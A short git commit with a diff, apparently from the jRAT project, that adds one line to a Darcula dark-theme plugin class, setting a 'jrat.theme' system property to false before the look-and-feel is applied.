e0eb585659da08d232671fad7b65a5979d8eb062
redpois0n <red@cmail.nu>
2016-02-07 18:19:35 +0100

    Disable jrat.theme

--- src/jrat/theme/darcula/Darcula.java
+++ src/jrat/theme/darcula/Darcula.java
@@ -9,6 +9,8 @@ public class Darcula extends Plugin {
 	public Darcula() {
 		super("Darcula Theme", "1.0", "Dark Theme", "jRAT");
 
+		System.setProperty("jrat.theme", "false");
+
 		try {
 			UIManager.setLookAndFeel(new DarculaLaf());
 		} catch (Exception ex) {
